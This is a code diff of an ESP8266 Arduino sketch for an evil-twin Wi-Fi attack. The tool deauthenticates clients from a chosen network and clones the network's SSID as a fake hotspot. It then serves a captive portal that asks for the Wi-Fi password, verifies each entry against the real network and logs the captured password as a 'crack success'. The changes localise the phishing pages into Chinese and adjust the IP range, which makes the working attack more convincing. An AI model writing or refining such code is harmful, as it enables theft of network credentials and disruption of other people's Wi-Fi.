@@ -68,7 +68,7 @@ String footer() {
 
 String index() {
   return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post><label>WiFi 密码:</label>" +
-         "<input type=password id='password' name='password' minlength='8'></input><input type=submit value=Continue></form>" + footer();
+         "<input type=password id='password' name='password' minlength='8'></input><input type=submit value=重试></form>" + footer();
 }
 
 void setup() {
@@ -76,9 +76,9 @@ void setup() {
   Serial.begin(115200);
   WiFi.mode(WIFI_AP_STA);
   wifi_promiscuous_enable(1);
-  WiFi.softAPConfig(IPAddress(192, 168, 2, 1) , IPAddress(192, 168, 2, 1) , IPAddress(255, 255, 255, 0));
+  WiFi.softAPConfig(IPAddress(192, 168, 123, 1) , IPAddress(192, 168, 123, 1) , IPAddress(255, 255, 255, 0));
   WiFi.softAP("HUAWEI-0W6W7EC", "dokidoki");
-  dnsServer.start(53, "*", IPAddress(192, 168, 2, 1));
+  dnsServer.start(53, "*", IPAddress(192, 168, 123, 1));
 
   webServer.on("/", handleIndex);
   webServer.on("/result", handleResult);
@@ -112,31 +112,36 @@ void handleResult() {
     if (webServer.arg("deauth") == "start") {
       deauthing_active = true;
     }
-    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;width:60px;height:60px'>&#8855;</wrong><br>密码错误！</h2><p>请确认密码重试！</p></center></body> </html>");
+    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script>"
+      "<meta http-equiv='Content-Type' content='text/html; charset=utf-8'>"
+      "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
+      "<body><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;width:60px;height:60px'>&#8855;</wrong>"
+      "<br>密码错误！</h2><p>请确认密码重试！</p></center></body> </html>");
     Serial.println("Someone entered the wrong WIFI password. ["+_tryPassword+"]");
   } else {
-    _correct = "WIFI crack success, ssid: " + _selectedNetwork.ssid + ", password: " + _tryPassword;
+    if (_selectedNetwork.ssid != "" && _tryPassword != ""){
+      _correct = "WIFI crack success, ssid: " + _selectedNetwork.ssid + ", password: " + _tryPassword;
+      Serial.println(_correct);
+    }
     hotspot_active = false;
     dnsServer.stop();
     int n = WiFi.softAPdisconnect (true);
-    Serial.println(String(n));
-    WiFi.softAPConfig(IPAddress(192, 168, 2, 1) , IPAddress(192, 168, 2, 1) , IPAddress(255, 255, 255, 0));
+    WiFi.softAPConfig(IPAddress(192, 168, 123, 1) , IPAddress(192, 168, 123, 1) , IPAddress(255, 255, 255, 0));
     WiFi.softAP("HUAWEI-0W6W7EC", "dokidoki");
-    dnsServer.start(53, "*", IPAddress(192, 168, 2, 1));
-    Serial.println("Pasword Entered!");
-    Serial.println(_correct);
+    dnsServer.start(53, "*", IPAddress(192, 168, 123, 1));
   }
 }
 
 
 String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
+                  "<meta http-equiv='Content-Type' content='text/html; charset=utf-8'>"
                    "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
                    "</head><body><div class='content'>"
                    "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
                    "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
                    "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
                    "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
-                   "</div></br><table><tr><th>SSID</th><th>WIFI</th><th>Channel</th><th>操作</th></tr>";
+                   "</div></br><table><tr><th>名称</th><th>MAC地址</th><th>频道</th><th>操作</th></tr>";
 
 void handleIndex() {
 
@@ -162,19 +167,17 @@ void handleIndex() {
 
       dnsServer.stop();
       int n = WiFi.softAPdisconnect (true);
-      Serial.println(String(n));
-      WiFi.softAPConfig(IPAddress(192, 168, 2, 1) , IPAddress(192, 168, 2, 1) , IPAddress(255, 255, 255, 0));
+      WiFi.softAPConfig(IPAddress(192, 168, 123, 1) , IPAddress(192, 168, 123, 1) , IPAddress(255, 255, 255, 0));
       WiFi.softAP(_selectedNetwork.ssid.c_str());
-      dnsServer.start(53, "*", IPAddress(192, 168, 2, 1));
+      dnsServer.start(53, "*", IPAddress(192, 168, 123, 1));
 
     } else if (webServer.arg("hotspot") == "stop") {
       hotspot_active = false;
       dnsServer.stop();
       int n = WiFi.softAPdisconnect (true);
-      Serial.println(String(n));
-      WiFi.softAPConfig(IPAddress(192, 168, 2, 1) , IPAddress(192, 168, 2, 1) , IPAddress(255, 255, 255, 0));
+      WiFi.softAPConfig(IPAddress(192, 168, 123, 1) , IPAddress(192, 168, 123, 1) , IPAddress(255, 255, 255, 0));
       WiFi.softAP("HUAWEI-0W6W7EC", "dokidoki");
-      dnsServer.start(53, "*", IPAddress(192, 168, 2, 1));
+      dnsServer.start(53, "*", IPAddress(192, 168, 123, 1));
     }
     return;
   }
@@ -237,7 +240,9 @@ void handleIndex() {
       delay(1000);
       WiFi.disconnect();
       WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
-      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><center><h2 style='font-size:7vw'>验证WIFI中, 请稍后...<br><progress value='10' max='100'>10%</progress></h2></center></body> </html>");
+      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script>" 
+        "<meta http-equiv='Content-Type' content='text/html; charset=utf-8'>" 
+        "</head><body><center><h2 style='font-size:7vw'>验证WIFI中, 请稍后...<br><progress value='10' max='100'>10%</progress></h2></center></body> </html>");
       if (webServer.arg("deauth") == "start") {
         deauthing_active = true;
       }
@@ -274,19 +279,17 @@ void handleAdmin() {
 
       dnsServer.stop();
       int n = WiFi.softAPdisconnect (true);
-      Serial.println(String(n));
-      WiFi.softAPConfig(IPAddress(192, 168, 2, 1) , IPAddress(192, 168, 2, 1) , IPAddress(255, 255, 255, 0));
+      WiFi.softAPConfig(IPAddress(192, 168, 123, 1) , IPAddress(192, 168, 123, 1) , IPAddress(255, 255, 255, 0));
       WiFi.softAP(_selectedNetwork.ssid.c_str());
-      dnsServer.start(53, "*", IPAddress(192, 168, 2, 1));
+      dnsServer.start(53, "*", IPAddress(192, 168, 123, 1));
 
     } else if (webServer.arg("hotspot") == "stop") {
       hotspot_active = false;
       dnsServer.stop();
       int n = WiFi.softAPdisconnect (true);
-      Serial.println(String(n));
-      WiFi.softAPConfig(IPAddress(192, 168, 2, 1) , IPAddress(192, 168, 2, 1) , IPAddress(255, 255, 255, 0));
+      WiFi.softAPConfig(IPAddress(192, 168, 123, 1) , IPAddress(192, 168, 123, 1) , IPAddress(255, 255, 255, 0));
       WiFi.softAP("HUAWEI-0W6W7EC", "dokidoki");
-      dnsServer.start(53, "*", IPAddress(192, 168, 2, 1));
+      dnsServer.start(53, "*", IPAddress(192, 168, 123, 1));
     }
     return;
   }
@@ -386,9 +389,9 @@ void loop() {
   }
 
   if (millis() - wifinow >= 2000) {
-    if (WiFi.status() != WL_CONNECTED) {
-      Serial.println("Wifi not connect to manager.");
-    }
+    // if (WiFi.status() != WL_CONNECTED) {
+    //   Serial.println("Wifi not connect to manager.");
+    // }
     wifinow = millis();
   }
 }
